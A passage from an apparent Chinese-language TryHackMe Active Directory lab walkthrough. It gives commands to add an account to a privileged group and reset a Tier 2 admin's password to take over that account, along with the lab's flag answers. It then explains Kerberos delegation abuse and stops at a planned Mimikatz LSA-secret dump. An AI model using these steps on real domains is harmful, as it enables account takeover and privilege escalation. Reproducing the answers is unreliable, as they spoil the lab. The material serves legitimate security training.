d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>如果一切顺利，你应该能看到你的账户作为成员。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="强制更改密码">强制更改密码<a href="#强制更改密码" class="hash-link" aria-label="强制更改密码的直接链接" title="强制更改密码的直接链接">​</a></h3>
<p>现在我们是 IT 支持  组的成员，我们已经继承了对第二层管理员组的 ForceChangePassword 权限委派。首先，我们需要识别这个组的成员以选择一个目标。我们可以再次使用 Get-ADGroupMember 命令来辅助进行这项工作：</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">PS</span><span class="token plain"> C:\&gt;</span><span class="token function" style="color:#d73a49">Get-ADGroupMember</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Identity </span><span class="token string" style="color:#e3116c">&quot;Tier 2 Admins&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">distinguishedName : CN=t2_lawrence</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">lewis</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">OU=T2 Admins</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">OU=Admins</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">DC=za</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">DC=tryhackme</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">DC=loc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">name              : t2_lawrence</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">lewis</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">objectClass       : user</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">objectGUID        : 4ca61b47-93c8-44d2-987d-eca30c69d828</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SamAccountName    : t2_lawrence</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">lewis</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SID               : S-1-5-21-3885271727-2693558621-2658995185-1893</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">distinguishedName : CN=t2_leon</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">francis</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">OU=T2 Admins</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">OU=Admins</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">DC=za</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">DC=tryhackme</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">DC=loc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">name              : t2_leon</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">francis</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">objectClass       : user</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">objectGUID        : 854b6d40-d537-4986-b586-c40950e0d5f9</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SamAccountName    : t2_leon</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">francis</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SID               : S-1-5-21-3885271727-2693558621-2658995185-3660</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>记下其中一个账户的用户名。由于网络是共享的，最好选择列表中的后面一个。我们将使用 Set-ADAccountPassword AD-RSAT cmdlet 来强制更改密码：</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">PS</span><span class="token plain"> C:\&gt;</span><span class="token variable" style="color:#36acaa">$Password</span><span class="token plain"> = </span><span class="token function" style="color:#d73a49">ConvertTo-SecureString</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;New.Password.For.User&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">AsPlainText </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Force</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">PS</span><span class="token plain"> C:\&gt;</span><span class="token function" style="color:#d73a49">Set-ADAccountPassword</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Identity </span><span class="token string" style="color:#e3116c">&quot;AD.Account.Username.Of.Target&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Reset </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">NewPassword </span><span class="token variable" style="color:#36acaa">$Password</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="theme-admonition theme-admonition-tip admonition_xJq3 alert alert--success"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>提示</div><div class="admonitionContent_BuS1"><p>如果出现 “拒绝访问” 错误，你的权限可能还没有在域中传播。这可能需要最多 10 分钟的时间。最好的方法是终止你的 SSH 或 RDP 会话，稍作休息，然后重新认证并重试。你也可以运行 <code>gpupdate /force</code>，然后断开连接并重新连接，在某些情况下，这样做会加快同步的速度。</p></div></div>
<p>如果这一步成功了，你现在应该能够使用这个目标账户和它的新密码在 THMWRK1 上进行身份验证。你目前具有对这台工作站的管理员访问权限。恭喜你！通过利用权限委派，你已正式将权限提升到了第二层管理员。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>哪个 ACE 允许您更新目标对象的任何不受保护的参数？</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">GenericWrite</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>THMWRK1 上管理员用户桌面上存储的标志值是多少 (flag1.txt)？</p><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 具体操作步骤 </summary><div><div class="collapsibleContent_i85q"><p>在通过 SSH 连接到 thmwrk1 之后</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ssh za.tryhackme.loc\\christopher.smith@thmwrk1.za.tryhackme.loc</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>切换到 powershell，并将自身账户加入到 <code>IT Support</code> 用户组里面</p><div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">PS</span><span class="token plain"> C:\Users\christopher</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">smith&gt; </span><span class="token function" style="color:#d73a49">Add-ADGroupMember</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;IT Support&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Members </span><span class="token string" style="color:#e3116c">&quot;christopher.smith&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>可以使用以下指令检查 <code>IT Support</code> 用户组内是否有自己的账户</p><div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">Get-ADGroupMember</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Identity </span><span class="token string" style="color:#e3116c">&quot;IT Support&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>接下来在二级管理员组里面挑选一名受害用户，并更改其用户密码</p><div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">PS</span><span class="token plain"> C:\Users\christopher</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">smith&gt; </span><span class="token function" style="color:#d73a49">Get-ADGroupMember</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Identity </span><span class="token string" style="color:#e3116c">&quot;Tier 2 Admins&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">distinguishedName : CN=t2_melanie</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">davies</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">OU=T2 Admins</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">OU=Admins</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">DC=za</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">DC=tryhackme</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">DC=loc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">name              : t2_melanie</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">davies</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">objectClass       : user</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">objectGUID        : c9625ed3-0391-40ba-9c6d-b4046049c434</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SamAccountName    : t2_melanie</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">davies</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SID               : S-1-5-21-3885271727-2693558621-2658995185-5929</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">PS</span><span class="token plain"> C:\Users\christopher</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">smith&gt; </span><span class="token variable" style="color:#36acaa">$Password</span><span class="token plain"> = </span><span class="token function" style="color:#d73a49">ConvertTo-SecureString</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;admin12345ABC&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">AsPlainText </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Force</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">PS</span><span class="token plain"> C:\Users\christopher</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">smith&gt; </span><span class="token function" style="color:#d73a49">Set-ADAccountPassword</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Identity </span><span class="token string" style="color:#e3116c">&quot;t2_melanie.davies&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Reset </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">NewPassword </span><span class="token variable" style="color:#36acaa">$Password</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>然后就可以通过 SSH 登录到此账户</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ssh za.tryhackme.loc\\t2_melanie.davies@thmwrk1.za.tryhackme.loc</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">za\t2_melanie.davies@THMWRK1 C:\Users\Administrator\Desktop&gt;whoami</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">za\t2_melanie.davies</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">za\t2_melanie.davies@THMWRK1 C:\Users\Administrator\Desktop&gt;type flag1.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">THM{Permission.Delegation.FTW!}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div></details><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{Permission.Delegation.FTW!}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="exploiting-kerberos-delegation---利用-kerberos-委派">Exploiting Kerberos Delegation - 利用 Kerberos 委派<a href="#exploiting-kerberos-delegation---利用-kerberos-委派" class="hash-link" aria-label="Exploiting Kerberos Delegation - 利用 Kerberos 委派的直接链接" title="Exploiting Kerberos Delegation - 利用 Kerberos 委派的直接链接">​</a></h2>
<p>接下来，我们将看看 Kerberos 委派。当谈论 AD 委派时，通常讨论的是 Kerberos 委派，而不是权限委派。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="kerberos-委派">Kerberos 委派<a href="#kerberos-委派" class="hash-link" aria-label="Kerberos 委派的直接链接" title="Kerberos 委派的直接链接">​</a></h3>
<p>Kerberos 委派的实际用途是使应用程序能够访问托管在不同服务器上的资源。例如，一个 Web 服务器需要访问托管在数据库服务器上的 SQL 数据库，以供其托管的 Web 应用程序使用。如果没有委派，我们可能会使用一个 AD 服务账户，并直接授予它对数据库的访问权限。当在 Web 应用程序上进行请求时，服务账户将用于对数据库进行身份验证和检索信息。</p>
<p>但是，我们可以允许该服务账户被委派到 SQL 服务器服务。一旦用户登录到我们的 Web 应用程序，服务账户将代表该用户请求访问数据库。这意味着用户只能访问他们具有  相关权限的数据库数据，而无需为服务账户本身提供任何数据库特权或权限。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="受约束与无约束">受约束与无约束<a href="#受约束与无约束" class="hash-link" aria-label="受约束与无约束的直接链接" title="受约束与无约束的直接链接">​</a></h3>
<p>有两种类型的 Kerberos 委派。在 Kerberos 委派的最初实现中，使用的是 Unconstrained Delegation （无约束委派），这是最不安全的方法。实质上，Unconstrained Delegation 没有对委派设置任何限制。在背景中，如果一个设置了 “TRUSTED_FOR_DELEGATION” 标志的用户在具有 Unconstrained Delegation 配置的主机上进行了身份验证，就会生成并存储该用户账户的票据授权票证（TGT），以便以后需要时使用。假设攻击者能够入侵一个启用了 Unconstrained Delegation 的主机，他们可以尝试迫使一个特权帐户对主机进行身份验证，这将允许他们拦截生成的 TGT 并冒充特权服务。如果你想看一个关于 Unconstrained Delegation 漏洞利用的例子，可以看 <a href="https://medium.com/@riccardo.ancarani94/exploiting-unconstrained-delegation-a81eabbd6976" target="_blank" rel="noopener noreferrer">Exploiting Unconstrained Delegation</a> 。</p>
<p>为了解决 Unconstrained Delegation 的安全问题，Microsoft 在 2003 年引入了 Constrained Delegation （约束委派）。Constrained Delegation 限制了一个帐户可以被委派到哪些服务，从而在帐户在遭遇入侵时限制了暴露的范围。以下是可以配置委派的一些示例服务：</p>
<ul>
<li>HTTP：用于 Web 应用程序，允许使用 AD 凭据进行透传身份验证。</li>
<li>CIFS：用于文件共享的 Common Internet File System，允许用户委派到共享。</li>
<li>LDAP：用于向 LDAP 服务委派，比如重置用户密码等操作。</li>
<li>HOST：允许在主机上进行所有活动的帐户委派。</li>
<li>MSSQL：允  许将用户帐户委派给 SQL 服务，以进行对数据库的透传身份验证。</li>
</ul>
<p>利用 Constrained Delegation 通常比利用 Unconstrained Delegation 更复杂，因为被委派的帐户不能被用于所有活动。然而，它仍然可以用于一些强大的利用。例如，如果我们能够入侵一个配置了 Constrained Delegation 的 AD 账户。通过知道这个账户的明文密码甚至只是 NTLM 哈希，我们可以为这个账户生成一个 TGT，然后使用该 TGT 对任何非敏感用户账户执行票据授权服务器（TGS）请求，以便作为该用户访问服务。想象一下冒充一个可以访问敏感数据库的账户的情况。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="基于资源的委派">基于资源的委派<a href="#基于资源的委派" class="hash-link" aria-label="基于资源的委派的直接链接" title="基于资源的委派的直接链接">​</a></h3>
<p>其实有三种类型的 Kerberos 委派。但 Resource-Based Constrained Delegation（RBCD）非常值得单独提及。由 Microsoft 在 2012 年引入，RBCD 再次为 Kerberos 委派增加了额外的安全限制。RBCD 完全改变了委派模型。不再是指定哪个对象可以委派给哪个服务，而是服务现在指定了哪些对象可以委派给它。这使得服务所有者能够控制谁可以访问它。在我们的 Web 应用程序示例中，这意味着我们不再需要指定 Web 服务帐户可以委派给数据库服务以访问数据库，而是可以在数据库服务上指定允许 Web 服务帐户委派访问它。</p>
<p>假设我们有权限为一个服务配置 RBCD。这意味着我们有能力为 AD 对象设置 msDS-AllowedToActOnBehalfOfOtherIdentity 属性。我们可以用我们访问权限的 AD 账户的详细信息填充这个属性。现在，为了访问这个服务，我们可以为我们控制的账户生成一个 TGT，这将允许我们与这个服务交互。如果你想了解 RBCD 利用的详细示例，可以看 <a href="https://blog.netwrix.com/2022/09/29/resource-based-constrained-delegation-abuse/" target="_blank" rel="noopener noreferrer">Resource-Based Constrained Delegation Abuse</a> 。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="针对受限委托的利用">针对受限委托的利用<a href="#针对受限委托的利用" class="hash-link" aria-label="针对受限委托的利用的直接链接" title="针对受限委托的利用的直接链接">​</a></h3>
<p>我们将利用 Constrained Delegation 来完成这个任务。首先，我们需要枚举可用的委派。我们可以使用我们的新特权用户在网络上运行一些命令。我们可以使用 PowerSploit 的 Get-NetUser 命令来进行这个枚举，运行以下命令：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">PowerShell</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\&gt;Import-Module C:\Tools\PowerView.ps1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\&gt;Get-NetUser -TrustedToAuth</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>根据这个命令的输出，我们可以看到 svcIIS 账户可以委派 THMSERVER1 上的 HTTP 和 WSMAN 服务。你可能会认为这意味着我们只能代表模拟用户访问网站。然而，PowerShell 远程管理也使用 HTTP 和 WSMAN 服务。理想的选择是冒充一个第一层管理员，因为这将为我们提供对 THMSERVER1 的管理访问权限。</p>
<p>如果你对 THMWRK1 进行适当的后渗透枚举，你会发现主机上有一个作为 svcIIS 用户运行的服务。由于我们现在有管理访问权限，我们可以利用这一点来 dump LSASecrets，Windows 注册表中存储凭据的一部分，用于诸如 Windows 服务等功能。让我们使用 Mimikatz 来 dump 这些秘密：</p>
